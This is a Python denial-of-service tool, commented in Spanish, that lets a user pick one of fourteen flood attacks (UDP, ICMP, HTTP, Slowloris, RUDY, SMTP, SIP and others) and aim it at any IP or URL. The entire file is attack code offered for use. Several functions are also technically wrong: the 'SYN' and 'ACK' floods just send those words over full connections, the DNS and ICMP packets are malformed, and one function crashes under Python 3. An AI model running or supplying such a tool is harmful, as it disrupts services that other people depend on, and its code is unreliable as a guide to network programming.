import socket
import threading
import random
import time
import requests
from urllib.parse import urlparse

# Lista de User-Agents para ataques HTTP
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.2 Safari/605.1.15",
]

def udp_flood(target_ip, target_port):
    """Realiza un ataque UDP Flood."""
    packet = random._urandom(1024)
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(packet, (target_ip, target_port))
        except (socket.error, OSError):
            pass

def icmp_flood(target_ip):
    """Realiza un ataque ICMP Flood."""
    packet = b"ICMP_FLOOD"
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            s.sendto(packet, (target_ip, 0))
        except (socket.error, OSError):
            pass

def http_get_flood(target_url):
    """Realiza un ataque HTTP GET Flood."""
    while True:
        try:
            requests.get(target_url, headers={"User-Agent": random.choice(user_agents)})
        except requests.exceptions.RequestException:
            pass

def http_post_flood(target_url):
    """Realiza un ataque HTTP POST Flood."""
    while True:
        try:
            requests.post(target_url, data={"data": "A" * 1024}, headers={"User-Agent": random.choice(user_agents)})
        except requests.exceptions.RequestException:
            pass

def slowloris(target_ip, target_port):
    """Realiza un ataque Slowloris."""
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\nHost: {target_ip}\r\nUser-Agent: {random.choice(user_agents)}\r\nConnection: keep-alive\r\n".encode('utf-8'))
            time.sleep(15)
            s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode('utf-8'))
        except (socket.error, OSError):
            pass

def rudy(target_ip, target_port):
    """Realiza un ataque RUDY (R-U-Dead-Yet)."""
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            s.send(f"POST / HTTP/1.1\r\nHost: {target_ip}\r\nContent-Length: 4294967295\r\nUser-Agent: {random.choice(user_agents)}\r\nX-Progress-ID: {random.randint(1, 5000)}\r\n".encode('utf-8'))
        except (socket.error, OSError):
            pass

def goldeneye(target_ip, target_port):
    """Realiza un ataque GoldenEye."""
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\nHost: {target_ip}\r\nUser-Agent: {random.choice(user_agents)}\r\nConnection: keep-alive\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.5\r\n".encode('utf-8'))
        except (socket.error, OSError):
            pass

def tcp_ack_flood(target_ip, target_port):
    """Realiza un ataque TCP ACK Flood."""
    packet = b"ACK"
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            s.send(packet)
        except (socket.error, OSError):
            pass

def dns_flood(target_ip):
    """Realiza un ataque DNS Flood."""
    dns_query = b"whois.google"
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(dns_query, (target_ip, 53))
        except (socket.error, OSError):
            pass

def smtp_flood(target_ip, target_port=25):
    """Realiza un ataque SMTP Flood."""
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            s.send(b"EHLO test\r\n")
            s.send(b"MAIL FROM:<test@example.com>\r\n")
            s.send(b"RCPT TO:<victim@example.com>\r\n")
            s.send(b"DATA\r\nSubject: Test\r\n\r\nTest message\r\n.\r\n")
        except (socket.error, OSError):
            pass

def voip_flood(target_ip, target_port=5060):
    """Realiza un ataque VoIP Flood (SIP)."""
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(b"INVITE sip:victim@example.com SIP/2.0\r\n", (target_ip, target_port))
        except (socket.error, OSError):
            pass

def connection_flood(target_ip, target_port):
    """Realiza un ataque Connection Flood."""
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
        except (socket.error, OSError):
            pass

def application_layer_flood(target_ip, target_port):
    """Realiza un ataque Application Layer Flood."""
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            s.send(b"GET / HTTP/1.1\r\nHost: {}\r\n\r\n".format(target_ip.encode('utf-8')))
        except (socket.error, OSError):
            pass

def syn_flood(target_ip, target_port):
    """Realiza un ataque SYN Flood."""
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            s.send(b"SYN")
        except (socket.error, OSError):
            pass

if __name__ == "__main__":
    print("Elige el tipo de ataque flood:")
    print("1. UDP Flood")
    print("2. ICMP Flood")
    print("3. HTTP GET Flood")
    print("4. HTTP POST Flood")
    print("5. Slowloris")
    print("6. RUDY (R-U-Dead-Yet)")
    print("7. GoldenEye")
    print("8. TCP ACK Flood")
    print("9. DNS Flood")
    print("10. SMTP Flood")
    print("11. VoIP Flood")
    print("12. Connection Flood")
    print("13. Application Layer Flood")
    print("14. SYN Flood")

    choice = input("Selecciona una opción: ")

    target = input("Introduce la IP/URL de destino: ")
    target_port = int(input("Introduce el puerto de destino (si aplica): "))

    if choice == "1":
        threading.Thread(target=udp_flood, args=(target, target_port)).start()
    elif choice == "2":
        threading.Thread(target=icmp_flood, args=(target,)).start()
    elif choice == "3":
        threading.Thread(target=http_get_flood, args=(target,)).start()
    elif choice == "4":
        threading.Thread(target=http_post_flood, args=(target,)).start()
    elif choice == "5":
        threading.Thread(target=slowloris, args=(target, target_port)).start()
    elif choice == "6":
        threading.Thread(target=rudy, args=(target, target_port)).start()
    elif choice == "7":
        threading.Thread(target=goldeneye, args=(target, target_port)).start()
    elif choice == "8":
        threading.Thread(target=tcp_ack_flood, args=(target, target_port)).start()
    elif choice == "9":
        threading.Thread(target=dns_flood, args=(target,)).start()
    elif choice == "10":
        threading.Thread(target=smtp_flood, args=(target, target_port)).start()
    elif choice == "11":
        threading.Thread(target=voip_flood, args=(target, target_port)).start()
    elif choice == "12":
        threading.Thread(target=connection_flood, args=(target, target_port)).start()
    elif choice == "13":
        threading.Thread(target=application_layer_flood, args=(target, target_port)).start()
    elif choice == "14":
        threading.Thread(target=syn_flood, args=(target, target_port)).start()
    else:
        print("Opción no válida.")